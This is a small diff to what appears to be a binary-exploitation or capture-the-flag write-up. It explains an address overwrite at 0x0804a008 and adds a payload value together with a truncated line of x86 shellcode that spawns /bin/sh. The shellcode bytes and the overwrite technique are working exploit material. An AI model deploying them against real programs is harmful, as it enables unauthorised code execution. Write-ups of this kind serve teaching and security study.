@@ -311,4 +311,5 @@ What else do we have: by address `0x0804a008` lies function and there are 3 jump
 * address of the array beginning (so that address of shellcode is there and is dereferenced)
 
 As for values:
-* \x10\xa0\x04\x08 - from 4th byte of the
+* \x10\xa0\x04\x08 - from 4th byte of the buffer
+* \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\
